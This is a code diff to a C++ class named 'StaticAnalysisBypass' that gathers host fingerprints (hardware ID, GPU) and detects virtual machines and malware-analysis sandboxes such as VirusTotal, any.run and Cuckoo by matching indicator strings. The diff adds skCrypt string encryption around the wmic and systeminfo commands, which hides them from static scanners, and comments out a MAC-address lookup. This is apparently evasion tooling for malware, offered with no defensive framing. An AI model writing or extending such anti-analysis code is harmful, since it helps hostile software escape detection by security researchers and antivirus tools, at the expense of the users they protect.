@@ -1,7 +1,8 @@
 #include "StaticAnalysisBypass.h"
 
-std::string StaticAnalysisBypass::executeCommand(std::string command)
+std::string StaticAnalysisBypass::executeCommand(const char* szCmd)
 {
+    std::string         command = szCmd;
     HANDLE              hRead, hWrite;
     SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
 
@@ -47,7 +48,7 @@ std::string StaticAnalysisBypass::executeCommand(std::string command)
 
 std::string StaticAnalysisBypass::GetMACAddress()
 {
-    IP_ADAPTER_INFO* pAdapterInfo = nullptr;
+    /*IP_ADAPTER_INFO* pAdapterInfo = nullptr;
     ULONG            ulOutBufLen = sizeof(IP_ADAPTER_INFO);
     pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
     if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
@@ -68,13 +69,13 @@ std::string StaticAnalysisBypass::GetMACAddress()
         free(pAdapterInfo);
         return macAddress.str();
     }
-    free(pAdapterInfo);
+    free(pAdapterInfo);*/
     return "Unknown MAC";
 }
 
 std::string StaticAnalysisBypass::GetHWID()
 {
-    std::string hwid = executeCommand("wmic csproduct get uuid");
+    std::string hwid = executeCommand(skCrypt("wmic csproduct get uuid"));
     std::regex  regex("\\s+");
     std::string cleaned_hwid = std::regex_replace(hwid, regex, " ");
     return cleaned_hwid.substr(cleaned_hwid.find_first_not_of(" "), cleaned_hwid.find_last_not_of(" ") + 1);
@@ -82,7 +83,7 @@ std::string StaticAnalysisBypass::GetHWID()
 
 std::string StaticAnalysisBypass::GetGPUInfo()
 {
-    std::string        gpu_info = executeCommand("wmic path win32_videocontroller get caption");
+    std::string        gpu_info = executeCommand(skCrypt("wmic path win32_videocontroller get caption"));
     std::istringstream stream(gpu_info);
     std::string        line;
     std::getline(stream, line);
@@ -117,7 +118,7 @@ std::string StaticAnalysisBypass::GetUsername()
 
 bool StaticAnalysisBypass::DetectEnvironment()
 {
-    std::string              system_info = executeCommand("systeminfo");
+    std::string              system_info = executeCommand(skCrypt("systeminfo"));
     std::vector<std::string> vm_indicators = {"VBOX", "VIRTUALBOX", "VMWARE", "XEN", "QEMU", "VIRTUAL", "HYPERVISOR", "SBOX", "SANDBOX", "CWSANDBOX"};
     std::vector<std::string> analysis_indicators = {"virustotal",  "hybrid-analysis", "cuckoo",       "malwr",     "any.run", "reverse.it", "joe sandbox", "threatgrid",
         "cape sandbox", "totalhash",       "intezer", "ahnlab", "AhnLab"};
